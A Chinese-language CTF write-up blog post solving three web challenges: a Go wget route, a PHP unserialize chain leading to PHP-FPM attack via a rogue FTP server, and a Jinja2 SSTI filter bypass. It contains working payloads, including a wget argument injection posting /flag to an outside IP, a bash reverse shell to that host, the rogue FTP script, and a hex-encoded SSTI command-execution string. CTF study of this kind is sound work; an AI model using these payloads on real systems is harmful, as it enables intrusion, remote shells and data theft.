---
title: "陇原战疫CTF Wp"
slug: "longyuanzhanyi-ctf-wp"
description: "剩下的是nodejs和java，我先爬为敬"
date: 2021-11-16T14:24:03+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

## CheckIN

是个go的文件，发现了/wget路由可以执行wget命令，接收的参数可以是个数组

![image-20211116141624569](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211116141624569.png)

利用wget的参数外带flag

```
/wget?argv=1&agrv=--post-file&argv=/flag&agrv=http://101.35.114.107:8426/
```

![image-20211116142102694](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211116142102694.png)

## eaaasyphp

```php
<?php

class Check {
    public static $str1 = false;
    public static $str2 = false;
}


class Esle {
    public function __wakeup()
    {
        Check::$str1 = true;
    }
}


class Hint {

    public function __wakeup(){
        $this->hint = "no hint";
    }

    public function __destruct(){
        if(!$this->hint){
            $this->hint = "phpinfo";
            ($this->hint)();
        }
    }
}


class Bunny {

    public function __toString()
    {
        if (Check::$str2) {
            if(!$this->data){
                $this->data = $_REQUEST['data'];
            }
            file_put_contents($this->filename, $this->data);
        } else {
            throw new Error("Error");
        }
    }
}

class Welcome {
    public function __invoke()
    {
        Check::$str2 = true;
        return "Welcome" . $this->username;
    }
}

class Bypass {

    public function __destruct()
    {
        if (Check::$str1) {
            ($this->str4)();
        } else {
            throw new Error("Error");
        }
    }
}

if (isset($_GET['code'])) {
    unserialize($_GET['code']);
} else {
    highlight_file(__FILE__);
}
```

这个题，怎么说 还是我太年轻了 我以为这个就是简单的反序列化+shell写入，然后非常的疑惑为啥本地可以但是远程的shell死活就是不落地，一直在想怎么绕过，这是当时尝试的exp.php

```php
<?php
class Check {
    public static $str1 = false;
    public static $str2 = false;
}
class Esle {
    public $str3;
}
class Bunny {
    public $filename;
    public $data;
}
class Welcome {
    public $username;
}
class Bypass {
    public $str4;
}

$check = new Check();
$esle = new Esle();
$bypass = new Bypass();
$welcome = new Welcome();
$bunny = new Bunny();

$esle -> str3 = $bypass;
// $bypass -> str4 = 'phpinfo';
$bypass -> str4 = $welcome;
$welcome -> username = $bunny;
$bunny -> filename = "op.php";
$bunny -> data = "xyz"

$payload = serialize($esle);
echo $payload;
```

直到赛后才知道这又又又是fpm，需要用ftp打fpm，具体的内容我最近也正在总结，可以参见->[攻击 PHP-FPM 学习笔记](https://amiaaaz.github.io/2021/11/15/attack-php-fpm-study-notes/)（还没全部收尾）

首先是依据p牛的脚本生成一个urlencode的payload（这里引号有问题的话直接改脚本吧）

```bash
$ python fpm.py 127.0.0.1 '/var/www/html/index.php' -c '<?php exec("bash -c \'/bin/bash -i >& /dev/tcp/101.35.114.107/8426 0>&1\'");?>'
```

然后开一个恶意的ftp-server

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 8001))
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcome\n')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.\n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.\n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.\n')
#Size /
conn.send(b'550 Could not get the file size.\n')
#EPSV (1)
conn.send(b'150 ok\n')
#PASV
conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n') #STOR / (2)
conn.send(b'150 Permission denied.\n')
#QUIT
conn.send(b'221 Goodbye.\n')
conn.close()
print("endd")
```

修改之前的反序列化exp

```php
<?php
class Bunny{
    public function __construct(){
        $this->data = urldecode('xxxxxxxxxxxxxxxxxx');
        $this->filename = "ftp://101.35.114.107:8001/aaa";
    }
}

class Welcome{
    public function __construct(){
        $this->username = new Bunny();
    }
}

class Bypass{
    public function __construct(){
        $this->str4 = new Welcome();
    }
}

class Esle{
}

echo urlencode(serialize(array(new Esle(), new Bypass())));
```

get方式传入，同时vps上开一个ftp-server和一个监听反弹shell的端口，即可拿flag

![image-20211116141329800](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211116141329800.png)

## MagicMail

原题，ssti套壳，参见->[[DeconstruCTF 2021]Mega Mailer](https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/#webmega-mailer)，但是比赛的时候我没出，是我的问题，平时拿现成的payload梭惯了，自己构造的时候就露了怯

payload的构造参见->[Jinja2 SSTI filter bypasses](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f)，使用`attr()`+hex字符串的方式把基础payload给拼出来

```
sender=&receiver=&subject=&message={{()|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f")|attr("\x5f\x5f\x62\x61\x73\x65\x5f\x5f")|attr("\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f")()|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")(180)|attr("\x5f\x5f\x69\x6e\x69\x74\x5f\x5f")|attr("\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f")|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f")|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")("\x65\x76\x61\x6c")("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x27\x29\x2e\x72\x65\x61\x64\x28\x29")}}
```

```python
# 原本的样子
().__class__.__base__.subclasses()[180].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")
```
